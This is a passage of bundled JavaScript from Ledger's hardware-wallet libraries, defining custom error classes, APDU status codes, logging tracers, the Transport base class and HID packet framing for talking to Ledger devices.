  var DeviceNeedsRestart = createCustomErrorClass("DeviceSocketNoBulkStatus");
  var UnresponsiveDeviceError = createCustomErrorClass("UnresponsiveDeviceError");
  var DisconnectedDevice = createCustomErrorClass("DisconnectedDevice");
  var DisconnectedDeviceDuringOperation = createCustomErrorClass("DisconnectedDeviceDuringOperation");
  var DeviceExtractOnboardingStateError = createCustomErrorClass("DeviceExtractOnboardingStateError");
  var DeviceOnboardingStatePollingError = createCustomErrorClass("DeviceOnboardingStatePollingError");
  var EnpointConfigError = createCustomErrorClass("EnpointConfig");
  var EthAppPleaseEnableContractData = createCustomErrorClass("EthAppPleaseEnableContractData");
  var SolAppPleaseEnableContractData = createCustomErrorClass("SolAppPleaseEnableContractData");
  var CeloAppPleaseEnableContractData = createCustomErrorClass("CeloAppPleaseEnableContractData");
  var FeeEstimationFailed = createCustomErrorClass("FeeEstimationFailed");
  var FirmwareNotRecognized = createCustomErrorClass("FirmwareNotRecognized");
  var HardResetFail = createCustomErrorClass("HardResetFail");
  var InvalidXRPTag = createCustomErrorClass("InvalidXRPTag");
  var InvalidAddress = createCustomErrorClass("InvalidAddress");
  var InvalidTransactionError = createCustomErrorClass("InvalidTransactionError");
  var InvalidNonce = createCustomErrorClass("InvalidNonce");
  var InvalidAddressBecauseDestinationIsAlsoSource = createCustomErrorClass("InvalidAddressBecauseDestinationIsAlsoSource");
  var LatestMCUInstalledError = createCustomErrorClass("LatestMCUInstalledError");
  var LatestFirmwareVersionRequired = createCustomErrorClass("LatestFirmwareVersionRequired");
  var UnsupportedFeatureError = createCustomErrorClass("UnsupportedFeatureError");
  var NanoSNotSupported = createCustomErrorClass("NanoSNotSupported");
  var UnknownMCU = createCustomErrorClass("UnknownMCU");
  var LedgerAPIError = createCustomErrorClass("LedgerAPIError");
  var LedgerAPIErrorWithMessage = createCustomErrorClass("LedgerAPIErrorWithMessage");
  var LedgerAPINotAvailable = createCustomErrorClass("LedgerAPINotAvailable");
  var ManagerAppAlreadyInstalledError = createCustomErrorClass("ManagerAppAlreadyInstalled");
  var ManagerAppRelyOnBTCError = createCustomErrorClass("ManagerAppRelyOnBTC");
  var ManagerAppDepInstallRequired = createCustomErrorClass("ManagerAppDepInstallRequired");
  var ManagerAppDepUninstallRequired = createCustomErrorClass("ManagerAppDepUninstallRequired");
  var ManagerDeviceLockedError = createCustomErrorClass("ManagerDeviceLocked");
  var ManagerFirmwareNotEnoughSpaceError = createCustomErrorClass("ManagerFirmwareNotEnoughSpace");
  var ManagerNotEnoughSpaceError = createCustomErrorClass("ManagerNotEnoughSpace");
  var ManagerUninstallBTCDep = createCustomErrorClass("ManagerUninstallBTCDep");
  var NetworkDown = createCustomErrorClass("NetworkDown");
  var NetworkError = createCustomErrorClass("NetworkError");
  var NoAddressesFound = createCustomErrorClass("NoAddressesFound");
  var NotEnoughBalance = createCustomErrorClass("NotEnoughBalance");
  var NotEnoughBalanceFees = createCustomErrorClass("NotEnoughBalanceFees");
  var NotEnoughBalanceSwap = createCustomErrorClass("NotEnoughBalanceSwap");
  var NotEnoughBalanceToDelegate = createCustomErrorClass("NotEnoughBalanceToDelegate");
  var UnstakeNotEnoughStakedBalanceLeft = createCustomErrorClass("UnstakeNotEnoughStakedBalanceLeft");
  var RestakeNotEnoughStakedBalanceLeft = createCustomErrorClass("RestakeNotEnoughStakedBalanceLeft");
  var NotEnoughToRestake = createCustomErrorClass("NotEnoughToRestake");
  var NotEnoughToUnstake = createCustomErrorClass("NotEnoughToUnstake");
  var NotEnoughBalanceInParentAccount = createCustomErrorClass("NotEnoughBalanceInParentAccount");
  var NotEnoughSpendableBalance = createCustomErrorClass("NotEnoughSpendableBalance");
  var NotEnoughBalanceBecauseDestinationNotCreated = createCustomErrorClass("NotEnoughBalanceBecauseDestinationNotCreated");
  var NotEnoughToStake = createCustomErrorClass("NotEnoughToStake");
  var NoAccessToCamera = createCustomErrorClass("NoAccessToCamera");
  var NotEnoughGas = createCustomErrorClass("NotEnoughGas");
  var NotEnoughGasSwap = createCustomErrorClass("NotEnoughGasSwap");
  var TronEmptyAccount = createCustomErrorClass("TronEmptyAccount");
  var MaybeKeepTronAccountAlive = createCustomErrorClass("MaybeKeepTronAccountAlive");
  var NotSupportedLegacyAddress = createCustomErrorClass("NotSupportedLegacyAddress");
  var GasLessThanEstimate = createCustomErrorClass("GasLessThanEstimate");
  var PriorityFeeTooLow = createCustomErrorClass("PriorityFeeTooLow");
  var PriorityFeeTooHigh = createCustomErrorClass("PriorityFeeTooHigh");
  var PriorityFeeHigherThanMaxFee = createCustomErrorClass("PriorityFeeHigherThanMaxFee");
  var MaxFeeTooLow = createCustomErrorClass("MaxFeeTooLow");
  var PasswordsDontMatchError = createCustomErrorClass("PasswordsDontMatch");
  var PasswordIncorrectError = createCustomErrorClass("PasswordIncorrect");
  var RecommendSubAccountsToEmpty = createCustomErrorClass("RecommendSubAccountsToEmpty");
  var RecommendUndelegation = createCustomErrorClass("RecommendUndelegation");
  var TimeoutTagged = createCustomErrorClass("TimeoutTagged");
  var UnexpectedBootloader = createCustomErrorClass("UnexpectedBootloader");
  var MCUNotGenuineToDashboard = createCustomErrorClass("MCUNotGenuineToDashboard");
  var RecipientRequired = createCustomErrorClass("RecipientRequired");
  var UnavailableTezosOriginatedAccountReceive = createCustomErrorClass("UnavailableTezosOriginatedAccountReceive");
  var UnavailableTezosOriginatedAccountSend = createCustomErrorClass("UnavailableTezosOriginatedAccountSend");
  var UpdateFetchFileFail = createCustomErrorClass("UpdateFetchFileFail");
  var UpdateIncorrectHash = createCustomErrorClass("UpdateIncorrectHash");
  var UpdateIncorrectSig = createCustomErrorClass("UpdateIncorrectSig");
  var UpdateYourApp = createCustomErrorClass("UpdateYourApp");
  var UserRefusedDeviceNameChange = createCustomErrorClass("UserRefusedDeviceNameChange");
  var UserRefusedAddress = createCustomErrorClass("UserRefusedAddress");
  var UserRefusedFirmwareUpdate = createCustomErrorClass("UserRefusedFirmwareUpdate");
  var UserRefusedAllowManager = createCustomErrorClass("UserRefusedAllowManager");
  var UserRefusedOnDevice = createCustomErrorClass("UserRefusedOnDevice");
  var PinNotSet = createCustomErrorClass("PinNotSet");
  var ExpertModeRequired = createCustomErrorClass("ExpertModeRequired");
  var TransportOpenUserCancelled = createCustomErrorClass("TransportOpenUserCancelled");
  var TransportInterfaceNotAvailable = createCustomErrorClass("TransportInterfaceNotAvailable");
  var TransportRaceCondition = createCustomErrorClass("TransportRaceCondition");
  var TransportWebUSBGestureRequired = createCustomErrorClass("TransportWebUSBGestureRequired");
  var TransactionHasBeenValidatedError = createCustomErrorClass("TransactionHasBeenValidatedError");
  var TransportExchangeTimeoutError = createCustomErrorClass("TransportExchangeTimeoutError");
  var DeviceShouldStayInApp = createCustomErrorClass("DeviceShouldStayInApp");
  var WebsocketConnectionError = createCustomErrorClass("WebsocketConnectionError");
  var WebsocketConnectionFailed = createCustomErrorClass("WebsocketConnectionFailed");
  var WrongDeviceForAccount = createCustomErrorClass("WrongDeviceForAccount");
  var WrongDeviceForAccountPayout = createCustomErrorClass("WrongDeviceForAccountPayout");
  var MissingSwapPayloadParamaters = createCustomErrorClass("MissingSwapPayloadParamaters");
  var WrongDeviceForAccountRefund = createCustomErrorClass("WrongDeviceForAccountRefund");
  var WrongAppForCurrency = createCustomErrorClass("WrongAppForCurrency");
  var ETHAddressNonEIP = createCustomErrorClass("ETHAddressNonEIP");
  var CantScanQRCode = createCustomErrorClass("CantScanQRCode");
  var FeeNotLoaded = createCustomErrorClass("FeeNotLoaded");
  var FeeNotLoadedSwap = createCustomErrorClass("FeeNotLoadedSwap");
  var FeeRequired = createCustomErrorClass("FeeRequired");
  var FeeTooHigh = createCustomErrorClass("FeeTooHigh");
  var ValAddressRequired = createCustomErrorClass("ValAddressRequired");
  var RedelegateDstValAddressRequired = createCustomErrorClass("RedelegateDstValAddressRequired");
  var PendingOperation = createCustomErrorClass("PendingOperation");
  var SyncError = createCustomErrorClass("SyncError");
  var PairingFailed = createCustomErrorClass("PairingFailed");
  var PeerRemovedPairing = createCustomErrorClass("PeerRemovedPairing");
  var GenuineCheckFailed = createCustomErrorClass("GenuineCheckFailed");
  var LedgerAPI4xx = createCustomErrorClass("LedgerAPI4xx");
  var LedgerAPI5xx = createCustomErrorClass("LedgerAPI5xx");
  var FirmwareOrAppUpdateRequired = createCustomErrorClass("FirmwareOrAppUpdateRequired");
  var ReplacementTransactionUnderpriced = createCustomErrorClass("ReplacementTransactionUnderpriced");
  var OpReturnDataSizeLimit = createCustomErrorClass("OpReturnSizeLimit");
  var DustLimit = createCustomErrorClass("DustLimit");
  var ConcordiumInsufficientFunds = createCustomErrorClass("ConcordiumInsufficientFunds");
  var ConcordiumMemoTooLong = createCustomErrorClass("ConcordiumMemoTooLong");
  var ConcordiumPairingExpiredError = createCustomErrorClass("ConcordiumPairingExpiredError");
  var ConcordiumSessionExpiredError = createCustomErrorClass("ConcordiumSessionExpiredError");
  var ConcordiumTrustedMetadataServiceError = createCustomErrorClass("ConcordiumTrustedMetadataServiceError");
  var ConcordiumAddressVerificationFailedError = createCustomErrorClass("ConcordiumAddressVerificationFailedError");
  var ConcordiumInvalidMaxFeeError = createCustomErrorClass("ConcordiumInvalidMaxFeeError");
  var LanguageNotFound = createCustomErrorClass("LanguageNotFound");
  var NoDBPathGiven = createCustomErrorClass("NoDBPathGiven");
  var DBWrongPassword = createCustomErrorClass("DBWrongPassword");
  var DBNotReset = createCustomErrorClass("DBNotReset");
  var SequenceNumberError = createCustomErrorClass("SequenceNumberError");
  var DisabledTransactionBroadcastError = createCustomErrorClass("DisabledTransactionBroadcastError");
  var InvalidParameterError = createCustomErrorClass("InvalidParameterError");
  var HwTransportErrorType;
  (function(HwTransportErrorType2) {
    HwTransportErrorType2["Unknown"] = "Unknown";
    HwTransportErrorType2["LocationServicesDisabled"] = "LocationServicesDisabled";
    HwTransportErrorType2["LocationServicesUnauthorized"] = "LocationServicesUnauthorized";
    HwTransportErrorType2["BluetoothScanStartFailed"] = "BluetoothScanStartFailed";
  })(HwTransportErrorType || (HwTransportErrorType = {}));
  var TransportError = class extends Error {
    id;
    constructor(message, id2) {
      const name = "TransportError";
      super(message || name);
      this.name = name;
      this.message = message;
      this.stack = new Error(message).stack;
      this.id = id2;
    }
  };
  addCustomErrorDeserializer("TransportError", (e) => new TransportError(e.message, e.id));
  var StatusCodes = {
    ACCESS_CONDITION_NOT_FULFILLED: 38916,
    ALGORITHM_NOT_SUPPORTED: 38020,
    CLA_NOT_SUPPORTED: 28160,
    CLA_NOT_SUPPORTED_BOOTLOADER: 28161,
    CODE_BLOCKED: 38976,
    CODE_NOT_INITIALIZED: 38914,
    COMMAND_INCOMPATIBLE_FILE_STRUCTURE: 27009,
    CONDITIONS_OF_USE_NOT_SATISFIED: 27013,
    CONTRADICTION_INVALIDATION: 38928,
    CONTRADICTION_SECRET_CODE_STATUS: 38920,
    DEVICE_IN_RECOVERY_MODE: 26159,
    CUSTOM_IMAGE_EMPTY: 26158,
    FILE_ALREADY_EXISTS: 27273,
    FILE_NOT_FOUND: 37892,
    GP_AUTH_FAILED: 25344,
    HALTED: 28586,
    INCONSISTENT_FILE: 37896,
    INCORRECT_DATA: 27264,
    INCORRECT_LENGTH: 26368,
    INCORRECT_P1_P2: 27392,
    INS_NOT_SUPPORTED: 27904,
    DEVICE_NOT_ONBOARDED: 27911,
    DEVICE_NOT_ONBOARDED_2: 26129,
    INVALID_KCV: 38021,
    INVALID_OFFSET: 37890,
    LICENSING: 28482,
    LOCKED_DEVICE: 21781,
    MAX_VALUE_REACHED: 38992,
    MEMORY_PROBLEM: 37440,
    MISSING_CRITICAL_PARAMETER: 26624,
    NO_EF_SELECTED: 37888,
    NOT_ENOUGH_MEMORY_SPACE: 27268,
    OK: 36864,
    PIN_REMAINING_ATTEMPTS: 25536,
    REFERENCED_DATA_NOT_FOUND: 27272,
    SECURITY_STATUS_NOT_SATISFIED: 27010,
    TECHNICAL_PROBLEM: 28416,
    UNKNOWN_APDU: 27906,
    USER_REFUSED_ON_DEVICE: 21761,
    NOT_ENOUGH_SPACE: 20738,
    APP_NOT_FOUND_OR_INVALID_CONTEXT: 20771,
    INVALID_APP_NAME_LENGTH: 26378,
    GEN_AES_KEY_FAILED: 21529,
    INTERNAL_CRYPTO_OPERATION_FAILED: 21530,
    INTERNAL_COMPUTE_AES_CMAC_FAILED: 21531,
    ENCRYPT_APP_STORAGE_FAILED: 21532,
    INVALID_BACKUP_STATE: 26178,
    PIN_NOT_SET: 21762,
    INVALID_BACKUP_LENGTH: 26419,
    INVALID_RESTORE_STATE: 26179,
    INVALID_CHUNK_LENGTH: 26420,
    INVALID_BACKUP_HEADER: 26698,
    SW_BAD_STATE: 45063
  };
  function getAltStatusMessage(code) {
    switch (code) {
      // improve text of most common errors
      case 26368:
        return "Incorrect length";
      case 26624:
        return "Missing critical parameter";
      case 27010:
        return "Security not satisfied (dongle locked or have invalid access rights)";
      case 27013:
        return "Condition of use not satisfied (denied by the user?)";
      case 27264:
        return "Invalid data received";
      case 27392:
        return "Invalid parameter received";
      case 21781:
        return "Locked device";
      case 45063:
        return "Unexpected state on the device";
    }
    if (28416 <= code && code <= 28671) {
      return "Internal error, please report";
    }
  }
  var TransportStatusError = class _TransportStatusError extends Error {
    statusCode;
    statusText;
    /**
     * @param statusCode The error status code coming from a Transport implementation
     * @param options containing:
     *  - canBeMappedToChildError: enable the mapping of TransportStatusError to an error extending/inheriting from it
     *  . Ex: LockedDeviceError. Default to true.
     */
    constructor(statusCode, { canBeMappedToChildError = true } = {}) {
      const statusText = Object.keys(StatusCodes).find((k) => StatusCodes[k] === statusCode) || "UNKNOWN_ERROR";
      const smsg = getAltStatusMessage(statusCode) || statusText;
      const statusCodeStr = statusCode.toString(16);
      const message = `Ledger device: ${smsg} (0x${statusCodeStr})`;
      super(message);
      this.name = "TransportStatusError";
      this.statusCode = statusCode;
      this.statusText = statusText;
      Object.setPrototypeOf(this, _TransportStatusError.prototype);
      if (canBeMappedToChildError && statusCode === StatusCodes.LOCKED_DEVICE) {
        return new LockedDeviceError(message);
      }
    }
  };
  var LockedDeviceError = class _LockedDeviceError extends TransportStatusError {
    constructor(message) {
      super(StatusCodes.LOCKED_DEVICE, { canBeMappedToChildError: false });
      if (message) {
        this.message = message;
      }
      this.name = "LockedDeviceError";
      Object.setPrototypeOf(this, _LockedDeviceError.prototype);
    }
  };
  addCustomErrorDeserializer("TransportStatusError", (e) => new TransportStatusError(e.statusCode));

  // node_modules/@ledgerhq/logs/lib-es/index.js
  init_buffer_shim();
  var id = 0;
  var subscribers = [];
  var log = (type, message, data) => {
    const obj = {
      type,
      id: String(++id),
      date: /* @__PURE__ */ new Date()
    };
    if (message)
      obj.message = message;
    if (data)
      obj.data = data;
    dispatch(obj);
  };
  var trace = ({ type, message, data, context }) => {
    const obj = {
      type,
      id: String(++id),
      date: /* @__PURE__ */ new Date()
    };
    if (message)
      obj.message = message;
    if (data)
      obj.data = data;
    if (context)
      obj.context = context;
    dispatch(obj);
  };
  var LocalTracer = class _LocalTracer {
    type;
    context;
    constructor(type, context) {
      this.type = type;
      this.context = context;
    }
    trace(message, data) {
      trace({
        type: this.type,
        message,
        data,
        context: this.context
      });
    }
    getContext() {
      return this.context;
    }
    setContext(context) {
      this.context = context;
    }
    updateContext(contextToAdd) {
      this.context = { ...this.context, ...contextToAdd };
    }
    getType() {
      return this.type;
    }
    setType(type) {
      this.type = type;
    }
    /**
     * Create a new instance of the LocalTracer with an updated `type`
     *
     * It does not mutate the calling instance, but returns a new LocalTracer,
     * following a simple builder pattern.
     */
    withType(type) {
      return new _LocalTracer(type, this.context);
    }
    /**
     * Create a new instance of the LocalTracer with a new `context`
     *
     * It does not mutate the calling instance, but returns a new LocalTracer,
     * following a simple builder pattern.
     *
     * @param context A TraceContext, that can undefined to reset the context
     */
    withContext(context) {
      return new _LocalTracer(this.type, context);
    }
    /**
     * Create a new instance of the LocalTracer with an updated `context`,
     * on which an additional context is merged with the existing one.
     *
     * It does not mutate the calling instance, but returns a new LocalTracer,
     * following a simple builder pattern.
     */
    withUpdatedContext(contextToAdd) {
      return new _LocalTracer(this.type, { ...this.context, ...contextToAdd });
    }
  };
  var listen = (cb) => {
    subscribers.push(cb);
    return () => {
      const i = subscribers.indexOf(cb);
      if (i !== -1) {
        subscribers[i] = subscribers[subscribers.length - 1];
        subscribers.pop();
      }
    };
  };
  function dispatch(log3) {
    for (let i = 0; i < subscribers.length; i++) {
      try {
        subscribers[i](log3);
      } catch (e) {
        console.error(e);
      }
    }
  }
  if (typeof window !== "undefined") {
    window.__ledgerLogsListen = listen;
  }

  // node_modules/@ledgerhq/hw-transport-webhid/node_modules/@ledgerhq/hw-transport/lib-es/Transport.js
  var DEFAULT_LOG_TYPE = "transport";
  var Transport = class {
    exchangeTimeout = 3e4;
    unresponsiveTimeout = 15e3;
    deviceModel = null;
    tracer;
    constructor({ context, logType } = {}) {
      this.tracer = new LocalTracer(logType ?? DEFAULT_LOG_TYPE, context);
    }
    /**
     * Check if the transport is supported on the current platform/browser.
     * @returns {Promise<boolean>} A promise that resolves with a boolean indicating support.
     */
    static isSupported;
    /**
     * List all available descriptors for the transport.
     * For a better granularity, checkout `listen()`.
     *
     * @returns {Promise<Array<any>>} A promise that resolves with an array of descriptors.
     * @example
     * TransportFoo.list().then(descriptors => ...)
     */
    static list;
    /**
     * Listen for device events for the transport. The method takes an observer of DescriptorEvent and returns a Subscription.
     * A DescriptorEvent is an object containing a "descriptor" and a "type" field. The "type" field can be "add" or "remove", and the "descriptor" field can be passed to the "open" method.
     * The "listen" method will first emit all currently connected devices and then will emit events as they occur, such as when a USB device is plugged in or a Bluetooth device becomes discoverable.
     * @param {Observer<DescriptorEvent<any>>} observer - An object with "next", "error", and "complete" functions, following the observer pattern.
     * @returns {Subscription} A Subscription object on which you can call ".unsubscribe()" to stop listening to descriptors.
     * @example
    const sub = TransportFoo.listen({
    next: e => {
      if (e.type==="add") {
        sub.unsubscribe();
        const transport = await TransportFoo.open(e.descriptor);
        ...
      }
    },
    error: error => {},
    complete: () => {}
    })
     */
    static listen;
    /**
     * Attempt to create a Transport instance with a specific descriptor.
     * @param {any} descriptor - The descriptor to open the transport with.
     * @param {number} timeout - An optional timeout for the transport connection.
     * @param {TraceContext} context Optional tracing/log context
     * @returns {Promise<Transport>} A promise that resolves with a Transport instance.
     * @example
    TransportFoo.open(descriptor).then(transport => ...)
     */
    static open;
    /**
     * Send data to the device using a low level API.
     * It's recommended to use the "send" method for a higher level API.
     * @param {Buffer} apdu - The data to send.
     * @param {Object} options - Contains optional options for the exchange function
     *  - abortTimeoutMs: stop the exchange after a given timeout. Another timeout exists
     *    to detect unresponsive device (see `unresponsiveTimeout`). This timeout aborts the exchange.
     * @returns {Promise<Buffer>} A promise that resolves with the response data from the device.
     */
    exchange(_apdu, { abortTimeoutMs: _abortTimeoutMs } = {}) {
      throw new Error("exchange not implemented");
    }
    /**
     * Send apdus in batch to the device using a low level API.
     * The default implementation is to call exchange for each apdu.
     * @param {Array<Buffer>} apdus - array of apdus to send.
     * @param {Observer<Buffer>} observer - an observer that will receive the response of each apdu.
     * @returns {Subscription} A Subscription object on which you can call ".unsubscribe()" to stop sending apdus.
     */
    exchangeBulk(apdus, observer) {
      let unsubscribed = false;
      const unsubscribe = () => {
        unsubscribed = true;
      };
      const main = async () => {
        if (unsubscribed)
          return;
        for (const apdu of apdus) {
          const r = await this.exchange(apdu);
          if (unsubscribed)
            return;
          const status = r.readUInt16BE(r.length - 2);
          if (status !== StatusCodes.OK) {
            throw new TransportStatusError(status);
          }
          observer.next(r);
        }
      };
      main().then(() => !unsubscribed && observer.complete(), (e) => !unsubscribed && observer.error(e));
      return { unsubscribe };
    }
    /**
     * Set the "scramble key" for the next data exchanges with the device.
     * Each app can have a different scramble key and it is set internally during instantiation.
     * @param {string} key - The scramble key to set.
     * deprecated This method is no longer needed for modern transports and should be migrated away from.
     * no @ before deprecated as it breaks documentationjs on version 14.0.2
     * https://github.com/documentationjs/documentation/issues/1596
     */
    setScrambleKey(_key) {
    }
    /**
     * Close the connection with the device.
     *
     * Note: for certain transports (hw-transport-node-hid-singleton for ex), once the promise resolved,
     * the transport instance is actually still cached, and the device is disconnected only after a defined timeout.
     * But for the consumer of the Transport, this does not matter and it can consider the transport to be closed.
     *
     * @returns {Promise<void>} A promise that resolves when the transport is closed.
     */
    close() {
      return Promise.resolve();
    }
    _events = new import_events.default();
    /**
     * Listen for an event on the transport instance.
     * Transport implementations may have specific events. Common events include:
     * "disconnect" : triggered when the transport is disconnected.
     * @param {string} eventName - The name of the event to listen for.
     * @param {(...args: Array<any>) => any} cb - The callback function to be invoked when the event occurs.
     */
    on(eventName, cb) {
      this._events.on(eventName, cb);
    }
    /**
     * Stop listening to an event on an instance of transport.
     */
    off(eventName, cb) {
      this._events.removeListener(eventName, cb);
    }
    emit(event, ...args) {
      this._events.emit(event, ...args);
    }
    /**
     * Enable or not logs of the binary exchange
     */
    setDebugMode() {
      console.warn("setDebugMode is deprecated. use @ledgerhq/logs instead. No logs are emitted in this anymore.");
    }
    /**
     * Set a timeout (in milliseconds) for the exchange call. Only some transport might implement it. (e.g. U2F)
     */
    setExchangeTimeout(exchangeTimeout) {
      this.exchangeTimeout = exchangeTimeout;
    }
    /**
     * Define the delay before emitting "unresponsive" on an exchange that does not respond
     */
    setExchangeUnresponsiveTimeout(unresponsiveTimeout) {
      this.unresponsiveTimeout = unresponsiveTimeout;
    }
    /**
     * Send data to the device using the higher level API.
     *
     * @param {number} cla - The instruction class for the command.
     * @param {number} ins - The instruction code for the command.
     * @param {number} p1 - The first parameter for the instruction.
     * @param {number} p2 - The second parameter for the instruction.
     * @param {Buffer} data - The data to be sent. Defaults to an empty buffer.
     * @param {Array<number>} statusList - A list of acceptable status codes for the response. Defaults to [StatusCodes.OK].
     * @param {Object} options - Contains optional options for the exchange function
     *  - abortTimeoutMs: stop the send after a given timeout. Another timeout exists
     *    to detect unresponsive device (see `unresponsiveTimeout`). This timeout aborts the exchange.
     * @returns {Promise<Buffer>} A promise that resolves with the response data from the device.
     */
    send = async (cla, ins, p1, p2, data = import_buffer.Buffer.alloc(0), statusList = [StatusCodes.OK], { abortTimeoutMs } = {}) => {
      const tracer = this.tracer.withUpdatedContext({ function: "send" });
      if (data.length >= 256) {
        tracer.trace("data.length exceeded 256 bytes limit", { dataLength: data.length });
        throw new TransportError("data.length exceed 256 bytes limit. Got: " + data.length, "DataLengthTooBig");
      }
      const response = await this.exchange(
        // The size of the data is added in 1 byte just before `data`
        import_buffer.Buffer.concat([import_buffer.Buffer.from([cla, ins, p1, p2]), import_buffer.Buffer.from([data.length]), data]),
        { abortTimeoutMs }
      );
      const sw = response.readUInt16BE(response.length - 2);
      if (!statusList.some((s) => s === sw)) {
        throw new TransportStatusError(sw);
      }
      return response;
    };
    /**
     * create() allows to open the first descriptor available or
     * throw if there is none or if timeout is reached.
     * This is a light helper, alternative to using listen() and open() (that you may need for any more advanced usecase)
     * @example
    TransportFoo.create().then(transport => ...)
     */
    static create(openTimeout = 3e3, listenTimeout) {
      return new Promise((resolve, reject) => {
        let found = false;
        const sub = this.listen({
          next: (e) => {
            found = true;
            if (sub)
              sub.unsubscribe();
            if (listenTimeoutId)
              clearTimeout(listenTimeoutId);
            this.open(e.descriptor, openTimeout).then(resolve, reject);
          },
          error: (e) => {
            if (listenTimeoutId)
              clearTimeout(listenTimeoutId);
            reject(e);
          },
          complete: () => {
            if (listenTimeoutId)
              clearTimeout(listenTimeoutId);
            if (!found) {
              reject(new TransportError(this.ErrorMessage_NoDeviceFound, "NoDeviceFound"));
            }
          }
        });
        const listenTimeoutId = listenTimeout ? setTimeout(() => {
          sub.unsubscribe();
          reject(new TransportError(this.ErrorMessage_ListenTimeout, "ListenTimeout"));
        }, listenTimeout) : null;
      });
    }
    // Blocks other exchange to happen concurrently
    exchangeBusyPromise;
    /**
     * Wrapper to make an exchange "atomic" (blocking any other exchange)
     *
     * It also handles "unresponsiveness" by emitting "unresponsive" and "responsive" events.
     *
     * @param f The exchange job, using the transport to run
     * @returns a Promise resolving with the output of the given job
     */
    async exchangeAtomicImpl(f) {
      const tracer = this.tracer.withUpdatedContext({
        function: "exchangeAtomicImpl",
        unresponsiveTimeout: this.unresponsiveTimeout
      });
      if (this.exchangeBusyPromise) {
        tracer.trace("Atomic exchange is already busy");
        throw new TransportRaceCondition("An action was already pending on the Ledger device. Please deny or reconnect.");
      }
      let resolveBusy;
      const busyPromise = new Promise((r) => {
        resolveBusy = r;
      });
      this.exchangeBusyPromise = busyPromise;
      let unresponsiveReached = false;
      const timeout = setTimeout(() => {
        tracer.trace(`Timeout reached, emitting Transport event "unresponsive"`, {
          unresponsiveTimeout: this.unresponsiveTimeout
        });
        unresponsiveReached = true;
        this.emit("unresponsive");
      }, this.unresponsiveTimeout);
      try {
        const res = await f();
        if (unresponsiveReached) {
          tracer.trace("Device was unresponsive, emitting responsive");
          this.emit("responsive");
        }
        return res;
      } finally {
        tracer.trace("Finalize, clearing busy guard");
        clearTimeout(timeout);
        if (resolveBusy)
          resolveBusy();
        this.exchangeBusyPromise = null;
      }
    }
    decorateAppAPIMethods(self, methods, scrambleKey) {
      for (const methodName of methods) {
        self[methodName] = this.decorateAppAPIMethod(methodName, self[methodName], self, scrambleKey);
      }
    }
    _appAPIlock = null;
    decorateAppAPIMethod(methodName, f, ctx, scrambleKey) {
      return async (...args) => {
        const { _appAPIlock } = this;
        if (_appAPIlock) {
          return Promise.reject(new TransportError("Ledger Device is busy (lock " + _appAPIlock + ")", "TransportLocked"));
        }
        try {
          this._appAPIlock = methodName;
          this.setScrambleKey(scrambleKey);
          return await f.apply(ctx, args);
        } finally {
          this._appAPIlock = null;
        }
      };
    }
    /**
     * Sets the context used by the logging/tracing mechanism
     *
     * Useful when re-using (cached) the same Transport instance,
     * but with a new tracing context.
     *
     * @param context A TraceContext, that can undefined to reset the context
     */
    setTraceContext(context) {
      this.tracer = this.tracer.withContext(context);
    }
    /**
     * Updates the context used by the logging/tracing mechanism
     *
     * The update only overrides the key-value that are already defined in the current context.
     *
     * @param contextToAdd A TraceContext that will be added to the current context
     */
    updateTraceContext(contextToAdd) {
      this.tracer.updateContext(contextToAdd);
    }
    /**
     * Gets the tracing context of the transport instance
     */
    getTraceContext() {
      return this.tracer.getContext();
    }
    static ErrorMessage_ListenTimeout = "No Ledger device found (timeout)";
    static ErrorMessage_NoDeviceFound = "No Ledger device found";
  };

  // node_modules/@ledgerhq/hw-transport-webhid/lib-es/hid-framing.js
  init_buffer_shim();
  var Tag = 5;
  function asUInt16BE(value) {
    const b = import_buffer.Buffer.alloc(2);
    b.writeUInt16BE(value, 0);
    return b;
  }
  var initialAcc = {
    data: import_buffer.Buffer.alloc(0),
    dataLength: 0,
    sequence: 0
  };
  var createHIDframing = (channel, packetSize) => {
    return {
      /**
       * Frames/encodes an APDU message into HID USB packets/frames
       *
       * @param apdu The APDU message to send, in a Buffer containing [cla, ins, p1, p2, data length, data(if not empty)]
       * @returns an array of HID USB frames ready to be sent
       */
      makeBlocks(apdu) {
        let data = import_buffer.Buffer.concat([asUInt16BE(apdu.length), apdu]);
        const blockSize = packetSize - 5;
        const nbBlocks = Math.ceil(data.length / blockSize);
        data = import_buffer.Buffer.concat([data, import_buffer.Buffer.alloc(nbBlocks * blockSize - data.length + 1).fill(0)]);
        const blocks = [];
        for (let i = 0; i < nbBlocks; i++) {
          const head = import_buffer.Buffer.alloc(5);
          head.writeUInt16BE(channel, 0);
          head.writeUInt8(Tag, 2);
          head.writeUInt16BE(i, 3);
          const chunk = data.slice(i * blockSize, (i + 1) * blockSize);
          blocks.push(new Uint8Array(import_buffer.Buffer.concat([head, chunk])));
        }
        return blocks;
      },
      /**
       * Reduces HID USB packets/frames to one response.
       *
       * @param acc The value resulting from (accumulating) the previous call of reduceResponse.
       *   On first call initialized to `initialAcc`. The accumulator enables handling multi-frames messages.
       * @param chunk Current chunk to reduce into accumulator
       * @returns An accumulator value updated with the current chunk
       */
      reduceResponse(acc, chunk) {
        let { data, dataLength, sequence } = acc || initialAcc;
        if (chunk.readUInt16BE(0) !== channel) {
          throw new TransportError("Invalid channel", "InvalidChannel");
        }
        if (chunk.readUInt8(2) !== Tag) {
          throw new TransportError("Invalid tag", "InvalidTag");
        }
        if (chunk.readUInt16BE(3) !== sequence) {
          throw new TransportError("Invalid sequence", "InvalidSequence");
        }
        if (!acc) {
          dataLength = chunk.readUInt16BE(5);
        }
        sequence++;
        const chunkData = chunk.slice(acc ? 5 : 7);
        data = import_buffer.Buffer.concat([data, chunkData]);
        if (data.length > dataLength) {
          data = data.slice(0, dataLength);
        }
        return {
          data,
          dataLength,
          sequence
        };
      },
      /**
       * Returns the response message that has been reduced from the HID USB frames
       *
       * @param acc The accumulator
       * @returns A Buffer containing the cleaned response message, or null if no response message, or undefined if the
       *   accumulator is incorrect (message length is not valid)
       */
      getReducedResult(acc) {
        if (acc && acc.dataLength === acc.data.length) {
          return acc.data;
        }
      }
    };
  };
  var hid_framing_default = createHIDframing;

  // node_modules/@ledgerhq/hw-transport-webhid/node_modules/@ledgerhq/devices/lib-es/index.js
  init_buffer_shim();
  var import_semver = __toESM(require_semver2());
  var DeviceModelId;
  (function(DeviceModelId2) {
    DeviceModelId2["blue"] = "blue";
    DeviceModelId2["nanoS"] = "nanoS";
    DeviceModelId2["nanoSP"] = "nanoSP";
    DeviceModelId2["nanoX"] = "nanoX";
    DeviceModelId2["stax"] = "stax";
    DeviceModelId2["europa"] = "europa";
    DeviceModelId2["apex"] = "apex";
